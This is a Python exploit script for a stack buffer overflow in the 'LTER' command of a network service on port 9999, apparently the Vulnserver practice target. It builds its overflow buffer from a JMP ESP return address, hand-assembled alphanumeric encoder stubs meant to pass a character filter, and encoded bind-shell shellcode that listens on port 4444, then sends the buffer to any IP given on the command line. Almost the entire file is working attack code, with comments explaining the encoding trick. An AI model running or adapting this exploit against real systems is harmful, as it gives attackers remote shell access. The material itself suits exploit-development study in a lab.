#!/usr/bin/python

import sys, socket
if len(sys.argv) < 2:
    sys.exit('Usage: %s IP' % sys.argv[0])

#JMP ESP 0x62501203
EIP = "\x03\x12\x50\x62"

#Ascii encoded Bind 4444
Shellcode = (
#"\x89\xe2\xda\xda\xd9\x72\xf4\x5d"
"\x55\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x69\x6c\x4d\x38\x6b\x32\x53\x30\x57\x70\x43\x30\x53\x50\x6d"
"\x59\x6a\x45\x55\x61\x49\x50\x63\x54\x4e\x6b\x76\x30\x36\x50"
"\x6e\x6b\x52\x72\x34\x4c\x4e\x6b\x63\x62\x56\x74\x4c\x4b\x70"
"\x72\x57\x58\x54\x4f\x6f\x47\x70\x4a\x37\x56\x35\x61\x6b\x4f"
"\x4c\x6c\x35\x6c\x75\x31\x61\x6c\x37\x72\x46\x4c\x45\x70\x39"
"\x51\x58\x4f\x44\x4d\x77\x71\x49\x57\x7a\x42\x38\x72\x51\x42"
"\x30\x57\x6e\x6b\x42\x72\x52\x30\x6c\x4b\x51\x5a\x75\x6c\x6c"
"\x4b\x32\x6c\x62\x31\x52\x58\x59\x73\x32\x68\x63\x31\x6e\x31"
"\x42\x71\x6e\x6b\x50\x59\x75\x70\x43\x31\x49\x43\x6e\x6b\x51"
"\x59\x42\x38\x38\x63\x45\x6a\x70\x49\x6e\x6b\x50\x34\x4c\x4b"
"\x53\x31\x79\x46\x35\x61\x79\x6f\x6e\x4c\x7a\x61\x38\x4f\x44"
"\x4d\x47\x71\x38\x47\x77\x48\x4b\x50\x61\x65\x4a\x56\x34\x43"
"\x51\x6d\x49\x68\x35\x6b\x63\x4d\x34\x64\x64\x35\x7a\x44\x66"
"\x38\x6e\x6b\x52\x78\x35\x74\x45\x51\x38\x53\x35\x36\x6e\x6b"
"\x74\x4c\x52\x6b\x6e\x6b\x31\x48\x75\x4c\x66\x61\x39\x43\x4c"
"\x4b\x53\x34\x6e\x6b\x37\x71\x7a\x70\x6f\x79\x63\x74\x57\x54"
"\x64\x64\x51\x4b\x61\x4b\x61\x71\x62\x79\x33\x6a\x32\x71\x4b"
"\x4f\x59\x70\x63\x6f\x73\x6f\x33\x6a\x6e\x6b\x34\x52\x7a\x4b"
"\x4e\x6d\x51\x4d\x45\x38\x55\x63\x46\x52\x65\x50\x33\x30\x52"
"\x48\x62\x57\x31\x63\x55\x62\x33\x6f\x53\x64\x51\x78\x52\x6c"
"\x61\x67\x76\x46\x74\x47\x4b\x4f\x49\x45\x58\x38\x4e\x70\x55"
"\x51\x53\x30\x37\x70\x55\x79\x78\x44\x66\x34\x66\x30\x70\x68"
"\x77\x59\x6d\x50\x70\x6b\x57\x70\x49\x6f\x59\x45\x42\x4a\x34"
"\x48\x31\x49\x46\x30\x69\x72\x69\x6d\x61\x50\x52\x70\x61\x50"
"\x76\x30\x71\x78\x4b\x5a\x66\x6f\x59\x4f\x69\x70\x59\x6f\x39"
"\x45\x6e\x77\x33\x58\x73\x32\x67\x70\x47\x61\x31\x4c\x4c\x49"
"\x48\x66\x73\x5a\x42\x30\x42\x76\x43\x67\x73\x58\x69\x52\x4b"
"\x6b\x36\x57\x71\x77\x49\x6f\x6a\x75\x72\x77\x75\x38\x4d\x67"
"\x49\x79\x34\x78\x39\x6f\x39\x6f\x79\x45\x61\x47\x75\x38\x32"
"\x54\x6a\x4c\x77\x4b\x49\x71\x4b\x4f\x48\x55\x42\x77\x4c\x57"
"\x33\x58\x33\x45\x52\x4e\x62\x6d\x75\x31\x59\x6f\x6b\x65\x63"
"\x58\x33\x53\x30\x6d\x35\x34\x33\x30\x6b\x39\x4b\x53\x52\x77"
"\x56\x37\x62\x77\x34\x71\x6a\x56\x30\x6a\x64\x52\x32\x79\x72"
"\x76\x59\x72\x69\x6d\x51\x76\x48\x47\x71\x54\x75\x74\x47\x4c"
"\x57\x71\x75\x51\x6c\x4d\x61\x54\x66\x44\x34\x50\x7a\x66\x35"
"\x50\x33\x74\x76\x34\x62\x70\x52\x76\x71\x46\x46\x36\x72\x66"
"\x51\x46\x30\x4e\x53\x66\x61\x46\x50\x53\x30\x56\x55\x38\x62"
"\x59\x5a\x6c\x55\x6f\x4d\x56\x79\x6f\x59\x45\x4d\x59\x69\x70"
"\x70\x4e\x36\x36\x57\x36\x79\x6f\x70\x30\x71\x78\x37\x78\x6c"
"\x47\x77\x6d\x61\x70\x4b\x4f\x59\x45\x6f\x4b\x48\x70\x4d\x65"
"\x69\x32\x30\x56\x31\x78\x49\x36\x4e\x75\x4f\x4d\x6f\x6d\x6b"
"\x4f\x58\x55\x35\x6c\x44\x46\x73\x4c\x35\x5a\x4f\x70\x49\x6b"
"\x6d\x30\x33\x45\x47\x75\x6f\x4b\x33\x77\x74\x53\x34\x32\x70"
"\x6f\x70\x6a\x43\x30\x32\x73\x6b\x4f\x49\x45\x41\x41")

#Here is the tricky part of the exploit. The exploit has a character fitler which does not allow anything but alphanumeric
#payloads. Msfvenom's encoder can help us out here and encode most of the payload for us, except the first 6 bytes.
#These 6 bytes are responsible for finding the payloads absolute location in memory in order to obtain fully 
#position-independent shellcode. Rather than encode everything ourselves, we are going to encode the first 8 bytes 
#and push just above our shellcode before execution:
#The bytes to encode are: 
#\x89\xe2\xda\xda
#\xd9\x72\xf4\x5d
#Thenw e return ESP to its original position by pushibg SUB ESP, 64

#Here is where we are going to align ESP just above our shellcode so we can push our encodings there.
#0x0183fa4c
Setup = ( #31 Bytes
"\x25\x4a\x4d\x4e\x55" # 25 4A4D4E55      AND EAX,554E4D4A
"\x25\x35\x32\x31\x2a" # 25 3532312A      AND EAX,2A313235
"\x54"	 	       #54                PUSH ESP
"\x58"                 #58                POP EAX
"\x54"		       #54		  PUSH ESP
"\x5D"		       #5D		  POP EBP
"\x2d\x7f\x7f\x7f\x7f" #2D 7F7F7F7F       SUB EAX,7F7F7F7F
"\x2d\x0F\x7A\x4F\x6F" #2D 0F7A4F6F       SUB EAX,6F4F7A0F
"\x2d\x06\x06\x31\x11" #2D 06063111       SUB EAX,11310606
"\x50"		       #50                PUSH EAX
"\x5c" 		       #5C                POP ESP
)

Encoder = ( 		#44 bytes
#5DF472D9"
"\x25\x4a\x4d\x4e\x55" #25 4A4D4E55       AND EAX,554E4D4A 
"\x25\x35\x32\x31\x2a" #25 3532312A       AND EAX,2A313235 
"\x2d\x01\x7F\x01\x7f" #2D 017F017F       SUB EAX,7F017F01
"\x2d\x26\x0E\x0A\x23" #2D 5D0A2830       SUB EAX,230A0E26
"\x50"                 #50                PUSH EAX
#DADAE289
"\x25\x4a\x4d\x4e\x55" #25 4A4D4E55       AND EAX,554E4D4A 
"\x25\x35\x32\x31\x2a" #25 3532312A       AND EAX,2A313235 
"\x2d\x6F\x01\x01\x01" #2D 6F010101       SUB EAX,0101016F
"\x2d\x08\x1C\x24\x24" #2D 081C2424       SUB EAX,24241C08 
"\x50"                 #50                PUSH EAX 
#4264EC83
"\x2d\x7f\x7f\x7f\x4f"
"\x2d\x2f\x6f\x7f\x2f"
"\x2d\x58\x07\x77\x19"
"\x50"
)

#EIP OFFSET 2006
crash = "LTER ."
buffer = crash + "A"*2006 + EIP + Setup + Encoder + "\x42"*19 + Shellcode + "B"*(1384-len(Shellcode)) + "CCCC"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 9999))
response = s.recv(1024)
print response
s.send(buffer)
s.close()

